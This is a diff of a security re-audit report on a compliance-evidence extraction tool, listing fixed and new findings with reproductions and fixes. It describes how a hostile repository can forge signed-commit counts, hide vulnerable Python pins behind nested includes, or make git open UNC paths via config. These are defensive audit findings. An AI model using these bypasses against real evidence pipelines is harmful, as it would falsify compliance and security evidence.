-   - Or set `GIT_CONFIG_NOSYSTEM=1` and `GIT_CONFIG_GLOBAL=<operator file>`, and run
-     against `--git-dir=<copy>`.
-4. Add a hostile-repo test for each key that asserts the UNC path is never opened (for
-   example, assert the key is overridden in argv and that evidence is unaffected).
+1. Fail closed when the config cannot be read for any reason (size, permissions, encoding).
+2. Stop classifying values by pattern. Run git against a clean private config instead:
+   - Copy `HEAD`, `refs/`, `packed-refs` and `objects/` (without `info/alternates`) into a temp git dir, write
+     a minimal `config`, and pass `--git-dir`/`--work-tree` explicitly.
+   - Or set `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=<operator file>` and `GIT_CEILING_DIRECTORIES`, and
+     refuse whenever `git rev-parse --git-dir` (run with that environment and `--no-includes`-style text
+     parsing) is not `<repo>/.git`.
+3. If pattern-matching is kept:
+   - Treat any value whose first two characters, after removing quotes, are both in `[\\/]` as UNC.
+   - Join continuation lines before testing.
+   - Search for `include` section headers anywhere on a line.
+   - Refuse a non-empty `objects/info/alternates`.
+   - Refuse bare repositories and paths whose git dir is not `<repo>/.git`.
+4. Add a hostile-repo test for each of G1–G6.
+
+### LOW-04 — PARTIALLY FIXED (still LOW)
+
+pip-audit now sees only `name==version` lines that the extractor writes into a private temp dir
+(`package-evidence.js:1114-1172`). Lines that cannot be audited become `auditGaps`, and `auditsRun` says
+`pip-partial`. Probes of `collectPinnedRequirements` with pip-audit 2.10.1:
+
+| Case | pinned | gaps | Verdict |
+|---|---|---|---|
+| clean: `requests==2.31.0`, `flask==3.0.0 ; marker` | both | none | correct; end to end `auditsRun:["pip"]`, 8 moderate, no gaps |
+| `--requirement=sub/x.txt` | requests | none | include followed, correct |
+| include loop a↔requirements | requests once | none | terminates, correct |
+| `-r ../outside.txt` | — | include outside repository | fails closed |
+| `-r nothere.txt` | — | gap | fails closed |
+| `-rsub.txt` (no space) | — | option | fails closed (under-audits) |
+| `requests==2.*`, `requests==${VER}`, `requests==\`+newline | — | not pinned | fails closed |
+| `requests[socks]==2.31.0`, tab separators | pinned | none | correct |
+| 20 MB file of junk lines | — | 100,000 gaps, 307 ms | no hang (see note) |
+| **6-level `-r` chain ending in `requests==2.31.0`** | **—** | **none** | **fails open** |
+
+**Fail-open reproduction**:
+- `requirements.txt` = `idna==3.10` + `-r r1.txt`, with `r1.txt` → `r2.txt` → … → `r6.txt` = `requests==2.31.0`.
+- The full extractor reports `moderate: 2, auditsRun: ["pip"], auditGaps: []`.
+- The control (`idna==3.10` + `requests==2.31.0`) reports `moderate: 8`.
+
+Six advisories are hidden and the evidence claims a complete audit. Cause:
+`if (seen[real] || depth > 5) return;` (`package-evidence.js:1069`) returns without recording a gap.
+
+Notes:
+- The 20 MB case writes every invalid line into `auditGaps`, at up to 100 characters each, so the evidence JSON
+  grows with the input. Consider capping the gap count.
+- `readText` has no size cap.
+
+**Remediation**: record a gap (`include depth limit`) when `depth > 5`, and test that.
+
+### LOW-02 / INFO-01 — FIXED
+
+- `stripYamlComments` (`ci-evidence.js:74-86`) is an `indexOf` scan, linear even for long whitespace runs.
+- `parsePyprojectDependencies` is a single pass. It returns at the first `[project]` `dependencies` array, and
+  bracket matching tracks quotes.
+
+### LOW-05 — FIXED
+
+`makeIsolatedDir` writes `sanitizeManifest(package.json)`, which keeps only `name`, `version`, `private`,
+`workspaces`, `overrides` and the dependency fields (`package-evidence.js:267-285`). Dropped: `volta`,
+`packageManager`, `engines`, `devEngines`, `scripts`, `config`, `publishConfig`.
+
+`workspaces` is the only retained key that names paths. Probe: an isolated dir with
+`"workspaces": ["<absolute path outside>/*"]` was run, and the outside package's manifest was then replaced
+with invalid JSON. `npm audit --json --loglevel silly` produced no read, error or workspace log line, and the
+extractor reported `auditsRun:["npm"]`. With a lockfile, npm audit builds the tree from `package-lock.json` and
+does not glob workspaces.
+
+Neither the registry URL nor the binary can be chosen from the manifest. The empty user and global npmrc files
+still apply.
+
+### INFO-03 — FIXED in this repository (see INFO-15)
+
+All three copies are byte-identical (md5 `1b072113…`). The assets were downloaded into a fresh empty scratch
+dir and hashed. They were not executed.
+
+| Asset | Recomputed | In HTML |
+|---|---|---|
+| cdnjs d3 7.9.0 `d3.min.js` | `sha512-vc58qvvB…Qi/32A==` | match (also matches the cdnjs API `sri` field) |
+| cdnjs topojson 3.0.2 `topojson.min.js` | `sha512-4UKI/XKm…/pO+82iRlg==` | match |
+| jsDelivr `world-atlas@2.0.2/countries-110m.json` | `sha384-yOCJ+8Sh…EeZWHf` | match |
+
+The scripts carry `crossorigin="anonymous"`. jsDelivr returns `access-control-allow-origin: *`, so the
+`integrity` option passed to `fetch()` through `d3.json` is enforceable. No `innerHTML`, `outerHTML` or
+`insertAdjacentHTML` remains. The tooltip is built with `createElement`/`textContent`/`replaceChildren`
+(`AI-Regulations-World-Map.html:210-221`).
+
+### INFO-04 — FIXED
+
+`setState` copies only `Object.keys(...)` of plain objects and drops `__proto__`, `constructor` and
+`prototype`. A missing `checklist` phase is created only when it is not an own property.
+
+### INFO-05 — FIXED
+
+`--locale` must match `^[a-z]{2}(-[A-Z]{2})?$` **and** appear in `i18n.listLocales()` (`autofill.js:698-704`).
+Traversal values cannot pass both checks.
+
+### INFO-09 — FIXED
+
+`HASH_RE = /^[0-9a-f]{7,64}$/i`. It still cannot begin with `-`, so the argv gate holds.
+
+### INFO-10 — PARTIALLY FIXED
+
+`resolveBinary('git.exe')` now resolves (`resolve-binary.js:26-29`). The other half is still open. In a Volta
+npm image, `npm-cli.js` sits next to `npm.cmd`, but `resolveNpm` (`package-evidence.js:213-226`) checks only
+`bin/node_modules/npm/bin/npm-cli.js` and then the npm bundled with Node, so the operator's chosen npm is
+silently replaced.
+
+### INFO-11 — FIXED (residue in INFO-14)
+
+`readReqFile` refuses any file that resolves outside the repo (`isUncPath` on the resolved path, then
+`isRepoFile`), including a symlinked top-level `requirements.txt`. `-r` UNC forms (`//`, `\\`, `/\`) are all
+caught, because the check runs on the `path.resolve` result.
 
 ---
 
-### [LOW-02] Quadratic regex in YAML comment stripping (hostile-repo DoS of ci-evidence) — STILL OPEN
-**CWE**: CWE-1333
-**File**: `tools/extractors/ci-evidence.js:77` (unchanged by 9cd7272)
-**Status**: Open
+## New Findings
 
-```js
-return line.replace(/\s+#.*$/, '');   // O(n^2) on a long whitespace run with no '#'
-```
+### [LOW-06] `pyproject.toml` / `Pipfile` dependencies are unaudited, and no gap is recorded, when `requirements.txt` exists
+**CWE**: CWE-754 (evidence fails open)
+**File**: `tools/extractors/package-evidence.js:1121-1123`, `:1357`
 
-Unchanged from the prior report: measured 10k→25 ms, 20k→93 ms, 40k→384 ms, 80k→1,555 ms.
-A ~1 MB line passes the 120 s extractor timeout, and ci-evidence is recorded as `{error}`.
-**Remediation**: Use `line.replace(/(^|[ \t])#.*$/, '$1')` or an `indexOf` scan, and cap
-per-file size.
+The "Pipfile and pyproject.toml are not audited" gap is added only when there is **no** `requirements.txt`.
 
----
+**Reproduction (pip-audit 2.10.1)**: a repo with `requirements.txt` = `idna==3.10`, `pyproject.toml`
+`[project] dependencies = ["requests==2.31.0"]` and `Pipfile` `requests = "==2.31.0"` gave
+`moderate: 2, auditsRun: ["pip"], auditGaps: []`. The vulnerable `requests` pin is hidden and the evidence
+claims a complete pip audit.
 
-### [LOW-03] `signedCommits` can be forged by a repo-local `gpg.ssh.allowedSignersFile` — NEW (introduced by the INFO-07 fix)
-**CWE**: CWE-345 (Insufficient Verification of Data Authenticity)
-**File**: `tools/extractors/git-evidence.js:123-155` (only `*.program` keys are pinned) and `:695-697`
-**Status**: Open
+**Remediation**: when `pyproject.toml` or `Pipfile` declares dependencies, always add a gap. Better, feed their
+exact pins (already parsed by `parsePip`) through the same `PINNED_REQ_RE` path.
 
-```js
-const SIGNING_PROGRAMS = [['gpg.program','gpg'], ['gpg.ssh.program','ssh-keygen'], ['gpg.x509.program','gpgsm']];
-...
-const signed = sigLines.filter(s => s === 'G').length;
-```
+### [INFO-12] Hash-pinned requirements (`pip-compile --generate-hashes`) are never audited
+**CWE**: CWE-754 (fails closed)
+**File**: `package-evidence.js:1029`, `:1071-1092`
 
-**Description**: For SSH signatures, `%G?` returns `G` only when the key is listed in
-`gpg.ssh.allowedSignersFile`. 9cd7272 pins the verifier program but not its trust
-anchor. Because repo-local config takes precedence over global config, the scanned repo
-decides which keys count as trusted.
+`requests==2.31.0 \` followed by `    --hash=sha256:…` produces two gaps: `not pinned` (the trailing `\`) and
+`option`. A single-line `requests==2.31.0 --hash=…` is also `not pinned`. The most strictly pinned format is
+therefore never audited. The `auditsRun` field stays honest, because it is empty or `pip-partial`.
 
-**Verified**: A test repo had 3 commits signed with a throwaway key. With only the
-operator's global allowed-signers file, the extractor reported
-`signedCommits: 0, signedPercentage: 0` (`%G?` = `U`). After
-`git config gpg.ssh.allowedSignersFile .allowed`, where `.allowed` is an in-repo file
-listing the attacker's own key, it reported `signedCommits: 3, signedPercentage: 100`.
-`gpg.minTrustLevel` is likewise taken from the repo.
+**Remediation**: join `\`-continued lines, and accept trailing `--hash=` options on a pinned line.
 
-The evidence is handed to compliance reviewers as proof of commit signing. Before 9cd7272
-the value was always 0, so this forgery path is new. It needs a hostile `.git/config`, as
-in MEDIUM-02.
+### [INFO-13] `sync-kb.js` git call does not use the extractor hardening
+**CWE**: CWE-426 / CWE-73 (latent)
+**File**: `tools/sync-kb.js:125-131`
 
-**Remediation**:
-- Pin `gpg.ssh.allowedSignersFile` (and `gpg.minTrustLevel`) to the operator's global
-  value, or to `os.devNull` when unset.
-- Document that `signedCommits` counts signatures trusted by the *operator's* keyring and
-  allowed-signers file. An alternative is to report "signature present" (`%G?` ≠ `N`)
-  separately from "verified by operator trust".
+`kbCommit` passes only `core.fsmonitor` and `core.hooksPath`. A knowledge-base checkout whose own config sets
+`log.showSignature=true` plus `gpg.program`, or an include or UNC path, would affect `git log -1`. The checkout is
+same-owner and CI uses a fresh clone, so this is informational.
 
----
+**Remediation**: reuse `GIT_HARDENING` and `checkRepoGitConfig`, or add `-c log.showSignature=false`.
 
-### [LOW-04] pip-audit evidence can claim a clean audit while pinned dependencies are hidden (`-r` include, path, URL or editable entries) — NEW (introduced by 9cd7272)
-**CWE**: CWE-754 (Improper Check for Unusual or Exceptional Conditions); evidence fails open
-**File**: `tools/extractors/package-evidence.js:928-941` (comment), `:962-980`, `:1155-1158`
-**Status**: Open
-
-```js
-var deps = Array.isArray(audit) ? audit : (... audit.dependencies ...);
-for (...) if (deps[i] && Array.isArray(deps[i].vulns)) counts.moderate += deps[i].vulns.length;
-...
-if (pipAudit) auditsRun.push('pip');      // pushed even if every dependency was skipped
-```
-
-**Description**: With `--disable-pip --no-deps`, pip-audit reads only the top-level file:
-- `include_nested=False` means `-r`/`-c` includes are ignored.
-- Path, URL and editable lines become `skip_reason` entries with no `vulns`.
-
-`runPipAudit` ignores `skip_reason`, and `extract()` records `auditsRun: ["pip"]`. The new
-`auditsRun` field exists to say whether zero vulnerabilities is real evidence, so this
-case defeats its purpose.
-
-**Verified with the extractor end to end (pip-audit 2.10.1)**:
-- `requirements.txt` = `requests==2.31.0` gives `moderate: 6, auditsRun: ["pip"]`.
-- `requirements.txt` = `-r prod.txt`, with `prod.txt` = `requests==2.31.0`, gives
-  `moderate: 0, auditsRun: ["pip"]`. The same vulnerable pin is hidden.
-- `requests==2.31.0` plus `flask>=2` gives `auditsRun: []`. One unpinned line aborts the
-  whole audit.
-
-The new code comment says "Unpinned entries are reported by pip-audit as errors and are
-not audited". That understates the effect: a single unpinned line suppresses the audit of
-every entry.
-
-**Remediation**:
-- Count `dependencies[].skip_reason` entries and record them, for example as
-  `vulnerabilities.pipSkipped`. Push `'pip'` to `auditsRun` only when at least one
-  dependency was resolved and audited.
-- Flag `-r`/`-c` lines as "not audited". Optionally, expand includes yourself with
-  `isRepoFile` containment, and write only validated `name==version` lines to a temp file.
-- Correct the comment.
-
----
-
-### [LOW-05] Volta `npm.exe` shim lets the scanned repo's `package.json` choose the Node/npm version npm audit runs with — NEW (pre-existing behavior, first reported)
-**CWE**: CWE-15 (External Control of System or Configuration Setting); related CWE-829
-**File**: `tools/extractors/package-evidence.js:212-225` (`resolveNpm` returns a `.exe` as-is), `:866` (isolated dir copies `package.json`)
-**Status**: Open
-
-```js
-var ext = path.extname(npmPath).toLowerCase();
-if (ext === '.cmd' || ext === '.bat' || ext === '.ps1') { ... npm-cli.js ... }
-return { file: npmPath, prefixArgs: [] };   // C:\Program Files\Volta\npm.EXE (Volta shim)
-```
-
-**Description**: Suppose Node is started without Volta, for example
-`C:\Program Files\nodejs\node.exe`, while `C:\Program Files\Volta` comes earlier on PATH.
-Then `resolveBinary('npm')` returns the Volta shim `npm.EXE`. The shim reads the
-`"volta"` key of the `package.json` in its cwd, which is the isolated audit directory
-holding the scanned repo's own `package.json`, and runs that toolchain.
-
-**Verified**: In this configuration, an isolated dir with
-`{"volta":{"node":"24.15.0","npm":"12.0.2"}}` made the extractor's resolved npm report
-`12.0.2`. Changing the pin to `12.2.0` changed the version that ran.
-
-Impact:
-- A pin to a version that is not installed makes Volta download and run it. This was not
-  exercised, to avoid network access. The download comes from Volta's configured
-  distribution source, not from an attacker, so this is not arbitrary code.
-- The scanned repo can force an old npm with different audit semantics, or force a
-  download.
-- `volta.extends` resolves other `package.json` files relative to the temp dir.
-
-This behavior predates 9cd7272: the Volta directory never had an extensionless `npm`.
-However, it is the path INFO-08's fix now relies on in this PATH layout.
-
-**Remediation**: For any non-`.js` npm result, prefer
-`process.execPath` + `<node dir>/node_modules/npm/bin/npm-cli.js`. Otherwise, set
-`VOLTA_BYPASS=1` in `extraEnv` for the npm audit call, or remove the `volta` key from the
-copied `package.json`.
-
----
-
-## Informational Findings
-
-### [INFO-01] ReDoS potential in package-evidence parsers — STILL OPEN
-**CWE**: CWE-1333
-**File**: `tools/extractors/package-evidence.js:530` (was `:557`. The lines shifted because `resolveBinary` moved out. The code is unchanged.)
-```js
-var depsMatch = pyText.match(/\[project\][\s\S]*?dependencies\s*=\s*\[([\s\S]*?)\]/);
-```
-Quadratic in the number of `[project]` occurrences. Fix: use `indexOf` and then parse line by line.
-
-### [INFO-02] PII in evidence JSON output — STILL OPEN (handling note)
-**CWE**: CWE-359 / CWE-312
-**File**: `tools/extractors/git-evidence.js:867, 896, 904`
-Author and committer names and emails go into the evidence and `compliance-config.json`.
-Treat these outputs as personal data. Note that `%aN` also honors a repo-controlled
-mailmap (MEDIUM-02).
-
-### [INFO-03] World map builds its tooltip with `innerHTML`, and CDN scripts have no SRI — STILL OPEN
-**CWE**: CWE-79 (latent), CWE-353 / CWE-829
-**Files**: `AI-Regulations-World-Map.html:45-46, 210, 225` (and its two copies)
-Unchanged. Fix: build the tooltip with `textContent`/`createElement`, add `integrity` and
-`crossorigin`, and pin `world-atlas@2.0.2`.
-
-### [INFO-04] Prototype pollution sink in content-labeling state restore — STILL OPEN
-**CWE**: CWE-1321
-**File**: `tools/interactive/content-labeling.html:180`
-Unchanged. The only source is the tool's own `sessionStorage`. Kept for defense in depth.
-
-### [INFO-05] `autofill.js --locale` is used in paths without validation — STILL OPEN
-**CWE**: CWE-22
-**File**: `tools/autofill.js:691, 711, 721`
-Unchanged. Operator argv only. Apply the i18n locale regex.
-
-### [INFO-06] `diff-tree -- <hash>` — FIXED in 9cd7272
-See Verification. `git-evidence.js:507`.
-
-### [INFO-07] Blank `gpg.program` zeroes `signedCommits` — FIXED in 9cd7272
-See Verification. The fix introduces LOW-03 and widens MEDIUM-02.
-
-### [INFO-08] npm resolves to the extensionless shim on Windows — FIXED in 9cd7272
-See Verification. Related residue is in LOW-05 and INFO-10.
-
-### [INFO-09] `HASH_RE` rejects SHA-256 object IDs, so AI-attribution evidence is always 0 for SHA-256 repositories — NEW (pre-existing since the F1 fix)
-**CWE**: CWE-754
-**File**: `tools/extractors/git-evidence.js:79`, used at `:466-467`
-```js
-const HASH_RE = /^[0-9a-f]{7,40}$/i;
-```
-**Verified**: On a `git init --object-format=sha256` repo with one commit carrying
-`Co-Authored-By: Claude <noreply@anthropic.com>`, `%H` is 64 characters. The extractor
-reported `aiAttributedCommits: 0`, `aiAttributionPercentage: 0`, `aiToolsDetected: []`
-and `topAiModifiedFiles: []`. The commits are counted in the total but are never
-classified. This is not exploitable, because the gate still blocks options, but the
-evidence fails open. Fix: `/^(?:[0-9a-f]{7,40}|[0-9a-f]{64})$/i`.
-
-### [INFO-10] Binary-resolution residue: Volta npm image layout is missed, and names with an extension no longer resolve — NEW
-**CWE**: CWE-754
-**Files**: `tools/extractors/package-evidence.js:217`, `tools/extractors/resolve-binary.js:23-26`
-
-There are two issues:
-1. In a Volta npm image, `npm-cli.js` sits next to `npm.cmd` (`…\npm\12.2.0\bin\npm-cli.js`),
-   not under `bin\node_modules\npm\bin\`. `resolveNpm` therefore misses the operator's
-   selected npm (12.2.0) and silently uses the npm bundled with the running Node. The
-   audit still runs, but with a different npm than the operator chose.
-2. On win32, `resolveBinary('git.exe')` and `resolveBinary('npm.cmd')` now return `null`,
-   because only `name + PATHEXT` is tried. No current caller passes an extension, so
-   nothing breaks today.
-
-Fix: also check `path.join(dirname(npmPath), 'npm-cli.js')`. In `resolveBinary`, try
-`''` when `name` already ends in a PATHEXT extension.
-
-### [INFO-11] `requirements.txt` is not checked with `isRepoFile`, so a symlink can make pip-audit read outside the repository — NEW
+### [INFO-14] Containment checks follow symlinks before validating them
 **CWE**: CWE-59
-**File**: `tools/extractors/package-evidence.js:153-157` (`fileExists` follows symlinks), `:955-962`
-This was found by code review and not reproduced. A `requirements.txt` symlink to any
-operator-readable file is parsed by pip-audit. Fragments of invalid lines can appear in
-pip-audit's stderr, which is not written to evidence. On POSIX, a FIFO makes pip-audit
-block until the 60 s timeout, because pip-audit copies FIFO inputs. The impact is small
-because evidence keeps only counts. Fix: gate on `isRepoFile()` as 3b9ca56 does for
-CHANGELOG, CODEOWNERS and LICENSE.
+**Files**: `git-config-guard.js:33` (`statSync` on `.git/config`, `config.worktree`, commondir targets);
+`package-evidence.js:154-157`, `:1017-1020`, `:1063-1068` (`fileExists`/`realpathSync` on `requirements.txt` and `-r` targets)
+
+A symlinked `.git/config` is **not refused**. `statSync` follows it, the guard checks the target's text, and git
+then reads the same target. A symlink to a network location is dereferenced by the check itself. On Windows,
+creating file symlinks needs Developer Mode or elevation, so the precondition is narrow.
+
+**Remediation**: `lstat` first. Refuse symlinked config files, and refuse requirement files whose link target is
+UNC, before calling `realpath`.
+
+### [INFO-15] World-map SRI/`textContent` fix exists only downstream; the next `sync-kb` run reverts it
+**CWE**: CWE-353 (regression risk)
+**File**: `tools/sync-kb.js:46-48` (the world map is a synced file)
+
+The upstream `justice8096/ai-regulatory-knowledge-base` `visualizations/AI-Regulations-World-Map.html` (fetched
+2026-10-12) has 0 `integrity` attributes and 1 `innerHTML`. Running `sync-kb.js --check` against it reports
+`differs` for all three copies. As a result:
+- CI's `kb-sync-check` job fails on this branch.
+- A routine `sync-kb` run would overwrite the fixed copies and restore INFO-03.
+
+The 9073c9a commit message acknowledges this.
+
+**Remediation**: land the same change in the knowledge base before merging. Add a test that every synced world
+map carries `integrity=` and contains no `innerHTML`.
+
+### [INFO-02] PII in evidence JSON — OPEN (handling note, unchanged)
+Author and committer names and emails remain in the evidence (`git-evidence.js`). Treat outputs as personal data.
 
 ---
 
 ## Areas Reviewed and Found Clean
 
-- **Process execution**: there are 4 exec sites, all argv arrays, all absolute binaries,
-  and no `shell: true` (see MEDIUM-01 verification).
-  - `runTool` rejects non-absolute files.
-  - `process.execPath` is used for the extractors and for `npm-cli.js`.
-  - `pip-audit.exe` started with cwd = the repo does not put the cwd on `sys.path`. Marker
-    `json.py`, `typing_extensions.py` and `sitecustomize.py` files planted there were
-    never imported.
-- **Signing-program pinning**: repo-local `gpg.program`, `gpg.openpgp.program`,
-  `gpg.ssh.program`, `gpg.x509.program` and `gpg.ssh.defaultKeyCommand` are not run. An
-  operator global bare-name value is not resolved from the repo worktree.
-  `operatorGitConfig` cannot be influenced by the scanned repo.
-- **git argv injection**: every repo-derived value is `isHash`-gated. `--grep=` is a single
-  argv entry. `since` is derived from an integer.
-- **package-evidence `runGit`** (`:231-240`) runs only `ls-files --error-unmatch -- <rel>`.
-  It does not verify signatures or read mailmap, and it carries the fsmonitor, hooksPath
-  and protocol hardening.
-- **New test file** `tests/regression-sast-2026-10-11.test.js`: it checks both the blocked
-  attack and the evidence value for each fix. The live hostile-`setup.py` test is skipped
-  without pip-audit. CI therefore exercises it only if pip-audit is installed there.
-- **Dynamic code, deserialization, interactive tools, CI workflow, dependencies and
-  secrets**: unchanged since the prior audit and still clean. 9cd7272 touches none of
-  these files.
+- **Pin rendering**: names and versions are limited by `PINNED_REQ_RE` (no spaces, `;`, `@`, `/` or newlines).
+  Markers are dropped, and the file pip-audit reads lives in a private `mkdtemp` dir that is removed afterwards.
+  pip-audit's cwd is that dir, not the repo.
+- **package-evidence `runGit`**: still only `ls-files --error-unmatch -- <rel>`, now gated by the guard. The
+  guard's weaknesses (MEDIUM-02) apply here too.
+- **New tests**: 52 tests were added across three files. All pass, and 2 skip without pip-audit. None covers G1–G6,
+  the depth cap, or LOW-06.
+- **Process execution**: no new exec sites except `sync-kb.js` (absolute `git` via `resolveBinary`, argv array,
+  no shell, output validated by a strict regex).
 
 ---
 
 ## DAST Assessment
 
-There are no server components, and 9cd7272 changes no browser-facing file. The prior
-assessment stands: `tools/interactive/` is clean, and the world map has one INFO item
-(INFO-03).
+There are no server components. Browser-facing changes:
+- World map: SRI verified, DOM-safe tooltip.
+- content-labeling: prototype guard verified.
+
+`tools/interactive/` is otherwise unchanged and clean.
 
 ---
 
 ## Verdict
 
-**PASS — 0 CRITICAL, 0 HIGH, 1 MEDIUM, 4 LOW, 8 INFO.**
+**PASS — 0 CRITICAL, 0 HIGH, 1 MEDIUM, 2 LOW, 6 INFO.**
 
-9cd7272 closes the HIGH code-execution path (HIGH-01) and the MEDIUM binary-planting path
-(MEDIUM-01). Both held up against adversarial probing. The three evidence regressions
-(INFO-06/07/08) are also fixed and covered by regression tests. Test results: 163/164 pass
-with 1 skip without pip-audit, and 164/164 pass with it.
+The round closes eight findings outright, and the HTML and supply-chain fixes check out against independently
+recomputed hashes. The PASS is conditional:
 
-The PASS is conditional on tracking the following:
-1. **MEDIUM-02**: repo-local `include.path`, `mailmap.file` and (new in 9cd7272)
-   `gpg.ssh.allowedSignersFile`/`revocationFile` let a hostile `.git/config` make git or
-   `ssh-keygen` open a UNC path on Windows. Fix this in the next hardening pass.
-2. **LOW-03 and LOW-04** let a hostile repo inflate its signed-commit percentage, or hide
-   its vulnerable Python pins behind a `-r` include, while the evidence still looks clean.
-   Fix both before the evidence is relied on for untrusted repositories, because they
-   undercut the `auditsRun` and `signedCommits` fields that 9cd7272 set out to make
-   trustworthy.
+1. **MEDIUM-02**: the git-config guard is a denylist with at least six bypasses, including a 1 MiB fail-open and a
+   bare or parent repository it never inspects. Replace it with a clean private git dir/config, or at least fail
+   closed on G1, G2 and G5, before the extractor is run on untrusted repositories on Windows.
+2. **LOW-04 residue and LOW-06**: the `auditsRun`/`auditGaps` contract can still claim a complete pip audit
+   while pins are hidden. Each needs a one-line gap fix.
+3. **INFO-15**: upstream the world-map fix before merging, or CI stays red and the fix is reverted on the next
+   sync.
 
 ---
 
-_Report generated by post-commit-audit skill (Step 1: SAST/DAST), independent re-audit, 2026-10-11_
+_Report generated by post-commit-audit skill (Step 1: SAST/DAST), independent re-audit round 2, 2026-10-12_
